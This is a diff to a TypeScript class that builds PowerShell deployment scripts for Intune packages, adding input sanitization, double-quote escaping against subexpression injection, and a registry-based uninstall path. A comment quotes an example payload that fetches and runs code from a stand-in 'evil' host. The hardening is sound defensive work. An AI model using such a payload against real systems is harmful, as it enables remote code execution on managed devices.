@@ -285,6 +285,14 @@ export class JobProcessor {
 
   /**
    * Get the installer file name from job
+   *
+   * This filename is later interpolated into the generated PowerShell deploy
+   * script (both single- and double-quoted contexts), which runs on every
+   * device the package is deployed to - so it must only ever contain a safe,
+   * quote/backtick/$-free character set rather than being escaped for one
+   * specific quoting style. Falls back to a generated name if nothing safe
+   * survives, which also closes off a bare ".." resolving outside the
+   * per-job work directory once path.join'd.
    */
   private getInstallerFileName(job: PackagingJob): string {
     // Try to extract filename from URL
@@ -299,8 +307,11 @@ export class JobProcessor {
       // Malformed escape sequence: keep the encoded name
     }
 
-    if (urlFileName && urlFileName.includes('.')) {
-      return urlFileName;
+    const sanitized = urlFileName.replace(/[^A-Za-z0-9._\- ()]/g, '');
+    const isDotsOnly = /^\.+$/.test(sanitized);
+
+    if (sanitized && !isDotsOnly && sanitized.includes('.')) {
+      return sanitized;
     }
 
     // Fall back to generating a name based on installer type
@@ -413,7 +424,11 @@ export class JobProcessor {
     const silentSwitches = this.extractSilentSwitches(job.install_command, job.installer_type).replace(/'/g, "''");
     const psadtVersion = '4.1.8';
     const appVendor = job.publisher.replace(/'/g, "''");
-    const appName = job.display_name.replace(/'/g, "''");
+    // appName is embedded both in single-quoted PS strings (quote-escaped
+    // above) and inside the <# ... #> doc-comment header below - a display
+    // name containing a literal "#>" would otherwise close that comment
+    // block early and let the rest of the name run as live PowerShell.
+    const appName = job.display_name.replace(/'/g, "''").replace(/#>/g, '# >');
     const appArch = this.sanitizeArchitecture(job.architecture);
     const appVersion = this.sanitizeVersion(job.version);
 
@@ -588,6 +603,15 @@ catch
   /**
    * Get custom install/uninstall command override from package_config.psadtConfig
    * Returns null when the override is absent, not a string, or empty/whitespace
+   *
+   * Trust boundary: this value (and postInstallCommands/postUninstallCommands
+   * below) is only ever the signed-in deploying user's own input from the
+   * PackageConfig UI (app/api/package/route.ts reads it straight off the
+   * authenticated request body) - never derived from winget catalog/manifest
+   * data. It's escaped only enough to stay inside its PowerShell single-quoted
+   * string; the raw value still reaches `cmd.exe /c` as shell input, which is
+   * fine for a user running their own command but would not be safe if a
+   * future caller ever populated this from untrusted/catalog-derived data.
    */
   private getCommandOverride(job: PackagingJob, key: 'installCommand' | 'uninstallCommand'): string | null {
     const psadtConfig = this.getPsadtConfig(job);
@@ -671,17 +695,34 @@ ${steps}
    * Programs after install, failing the deployment before the detection
    * marker is written when it does not
    * Opt-in via package_config.psadtConfig.verifyInstall; returns '' when disabled
+   *
+   * Skipped for MSIX/APPX regardless of the flag: Get-ADTApplication scans
+   * the traditional Programs/Uninstall registry, which provisioned MSIX
+   * packages never register in - the check would always report "not found"
+   * and throw immediately after a genuinely successful install, blocking the
+   * registry marker write and leaving Intune re-attempting (and re-failing)
+   * the same install forever. Add-AppxProvisionedPackage's own
+   * -ErrorAction Stop already fails loudly on a real provisioning failure,
+   * so there is nothing left for a separate verification step to catch here.
    */
   private getPostInstallVerificationBlock(job: PackagingJob, escapedAppName: string): string {
     const psadtConfig = this.getPsadtConfig(job);
     if (psadtConfig?.verifyInstall !== true) {
       return '';
     }
+    if (job.installer_type === 'msix' || job.installer_type === 'appx') {
+      return '';
+    }
+    // Separately escaped for the double-quoted `throw "..."` below -
+    // escapedAppName is only escaped for single-quote/`#>` breakout, which
+    // does nothing to stop PowerShell from evaluating $(...) subexpressions
+    // inside a double-quoted string.
+    const appNameDoubleQuoteEscaped = this.escapeForDoubleQuotedString(job.display_name);
     return `
     ## Verify the application actually installed before writing the detection marker
     $verifyApps = Get-ADTApplication -Name '${escapedAppName}' -NameMatch 'Contains' -ErrorAction SilentlyContinue
     if (-not $verifyApps) {
-        throw "Post-install verification failed: '${escapedAppName}' was not found in the installed applications list. The installer exited without error but the application does not appear to be installed."
+        throw "Post-install verification failed: '${appNameDoubleQuoteEscaped}' was not found in the installed applications list. The installer exited without error but the application does not appear to be installed."
     }
     Write-ADTLogEntry -Message "Post-install verification passed" -Source 'Install-ADTDeployment'
 `;
@@ -756,6 +797,12 @@ ${steps}
     }
 
     const nestedPathEscaped = nested.path.replace(/'/g, "''");
+    // Separately escaped for the double-quoted `throw "..."` below -
+    // single-quote escaping does nothing to stop PowerShell from evaluating
+    // $(...) subexpressions inside a double-quoted string, so reusing
+    // nestedPathEscaped there would let a manifest-controlled nested
+    // installer path (never sanitized/validated elsewhere) execute code.
+    const nestedPathDoubleQuoteEscaped = this.escapeForDoubleQuotedString(nested.path);
     const nestedType = (nested.type ?? '').toLowerCase();
 
     let executeLine: string;
@@ -776,7 +823,7 @@ ${steps}
         Expand-Archive -Path "$($adtSession.DirFiles)\\${fileName}" -DestinationPath $zipExtractDir -Force
         $nestedInstallerPath = Join-Path $zipExtractDir '${nestedPathEscaped}'
         if (-not (Test-Path -LiteralPath $nestedInstallerPath)) {
-            throw "Nested installer not found in archive: ${nestedPathEscaped}"
+            throw "Nested installer not found in archive: ${nestedPathDoubleQuoteEscaped}"
         }
         Write-ADTLogEntry -Message "Running nested installer: $nestedInstallerPath" -Severity 'Info' -Source 'Install-ADTDeployment'
         ${executeLine}
@@ -838,16 +885,89 @@ ${steps}
       return `Start-ADTMsiProcess -Action 'Uninstall' -ProductCode '${productCodeMatch[0]}' -SuccessExitCodes @(0, 1605, 1614, 3010, 1641)`;
     }
 
+    // Registry-based uninstall: lib/detection-rules.ts's generateUninstallCommand
+    // emits this marker for every exe/inno/nullsoft/burn installer (the
+    // majority of winget packages) whenever a display name is available -
+    // which is always. Without this branch, the marker string fell through
+    // to the generic cmd.exe /c handler below, which cannot execute
+    // "REGISTRY_UNINSTALL:<name>" as a command, silently no-opping uninstall
+    // (and any PSADT-driven update/replace flow that relies on it) for
+    // essentially every non-MSI/MSIX app packaged through this packager.
+    // Mirrors .github/scripts/Create-PSADTPackage.ps1's handling of the same
+    // marker in the hosted GitHub Actions pipeline.
+    const registryUninstallMatch = job.uninstall_command.match(/^REGISTRY_UNINSTALL:(.+)$/);
+    if (registryUninstallMatch) {
+      let displayName = registryUninstallMatch[1];
+      const suffixesToRemove = [
+        /\s*\(Install\)$/,
+        /\s*\(Machine-Wide Install\)$/,
+        /\s*\(Machine Wide Install\)$/,
+        /\s*\(User\)$/,
+        /\s*\(x64\)$/,
+        /\s*\(x86\)$/,
+        /\s*\(64-bit\)$/,
+        /\s*\(32-bit\)$/,
+      ];
+      for (const suffix of suffixesToRemove) {
+        displayName = displayName.replace(suffix, '');
+      }
+      displayName = displayName.trim();
+
+      const displayNameEscaped = displayName.replace(/'/g, "''");
+      const wingetIdEscaped = job.winget_id.replace(/'/g, "''");
+
+      return `$appName = '${displayNameEscaped}'
+    $wingetIdForUninstall = '${wingetIdEscaped}'
+    Write-ADTLogEntry -Message "Searching for installed application: $appName" -Source 'Uninstall-ADTDeployment'
+    $installedApp = Get-ADTApplication -Name $appName
+    if ($installedApp) {
+        Write-ADTLogEntry -Message "Found via registry name, uninstalling..." -Source 'Uninstall-ADTDeployment'
+        Uninstall-ADTApplication -Name $appName -SuccessExitCodes @(0, 1605, 1614) -RebootExitCodes @(1641, 3010)
+    } else {
+        Write-ADTLogEntry -Message "Not found by name '$appName', falling back to winget uninstall --id $wingetIdForUninstall" -Severity 'Warning' -Source 'Uninstall-ADTDeployment'
+        $wingetExe = Get-Command winget.exe -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source
+        if (-not $wingetExe) {
+            $wingetExe = Get-ChildItem "C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_*_*__8wekyb3d8bbwe\\winget.exe" -ErrorAction SilentlyContinue |
+                Sort-Object LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty FullName
+        }
+        if ($wingetExe) {
+            Start-ADTProcess -FilePath $wingetExe -ArgumentList "uninstall --id $wingetIdForUninstall --silent --accept-source-agreements --disable-interactivity" -WindowStyle Hidden -SuccessExitCodes @(0)
+        } else {
+            throw "Could not find installed application: $appName (winget not available for fallback)"
+        }
+    }`;
+    }
+
     const uninstallCmd = job.uninstall_command.replace(/'/g, "''");
     return `Start-ADTProcess -FilePath "$env:SystemRoot\\System32\\cmd.exe" -ArgumentList '/c ${uninstallCmd}' -WindowStyle Hidden`;
   }
 
   /**
-   * Sanitize wingetId for registry key name
-   * Replaces . and - with _ to match detection-rules.ts logic
+   * Sanitize wingetId for registry key name.
+   * Replaces . and - with _ to match detection-rules.ts logic, then strips
+   * anything outside a safe charset - the result is embedded unescaped into
+   * single-quoted PowerShell registry-marker literals, so a winget_id
+   * containing a quote/backtick would otherwise break out of that string.
+   * Keep this in sync with lib/detection-rules.ts's identical sanitizer.
    */
   private sanitizeWingetId(wingetId: string): string {
-    return wingetId.replace(/[\.\-]/g, '_');
+    return wingetId.replace(/[\.\-]/g, '_').replace(/[^A-Za-z0-9_+]/g, '');
+  }
+
+  /**
+   * Escape a value for safe embedding inside a PowerShell *double*-quoted
+   * string. Unlike single-quoted strings (where doubling `'` is the only
+   * escaping needed), double-quoted strings evaluate `$variable`/`$(...)`
+   * subexpressions and backtick escape sequences at runtime - a value
+   * already escaped only for single-quote breakout (e.g. via `.replace(/'/g,
+   * "''")`) is NOT safe to reuse in a double-quoted context, since nothing
+   * stops a manifest-controlled value like `$(iex(irm http://evil))` from
+   * executing while the string is built. Order matters: escape existing
+   * backticks first, then prefix `$`/`"` with a backtick, so the backticks
+   * that escaping just inserted are never re-escaped.
+   */
+  private escapeForDoubleQuotedString(value: string): string {
+    return value.replace(/`/g, '``').replace(/\$/g, '`$').replace(/"/g, '`"');
   }
 
   /**
@@ -864,6 +984,12 @@ ${steps}
    * unusual-but-legitimate versions outright, we strip everything outside
    * a safe allow-list of characters. If nothing safe remains, we fail
    * closed rather than silently packaging with an empty/mangled version.
+   *
+   * This character set must exactly match lib/registry-marker.ts's
+   * sanitizeMarkerVersion (which generateDetectionRules uses to build the
+   * Intune detection rule's comparisonValue) - otherwise the value actually
+   * written to the registry marker and the value Intune compares it against
+   * can permanently disagree.
    */
   private sanitizeVersion(version: string): string {
     const cleaned = (version ?? '').replace(/[^A-Za-z0-9.\-_+~]/g, '').slice(0, 128);
